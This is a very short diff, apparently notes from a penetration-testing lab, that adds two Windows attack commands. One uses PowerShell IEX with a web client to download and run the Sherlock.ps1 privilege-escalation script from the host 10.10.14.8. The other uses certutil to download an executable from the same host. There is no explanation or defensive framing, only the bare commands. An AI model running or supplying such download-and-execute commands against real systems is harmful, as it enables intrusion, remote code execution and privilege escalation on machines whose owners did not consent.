@@ -1,0 +1,6 @@
+
+Powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8:8081/Sherlock.ps1')
+
+
+certutil -urlcache -split -f "http://10.10.14.8:8082/powershell.exe" powershell.exe
+
